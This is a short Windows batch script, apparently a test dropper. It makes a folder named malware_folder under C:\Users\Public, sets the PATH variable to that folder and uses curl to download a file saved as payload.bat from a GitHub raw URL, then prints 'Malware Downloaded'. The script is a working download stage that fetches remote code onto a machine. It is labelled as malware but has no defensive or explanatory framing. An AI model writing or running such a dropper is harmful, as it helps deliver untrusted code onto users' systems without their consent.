@echo off

echo Hello, this is a BAT file!
set path=C:\Users\Public\malware_folder
mkdir %path%
echo %path%
curl -o %path%\payload.bat https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/Test2.bat
echo Malware Downloaded

pause
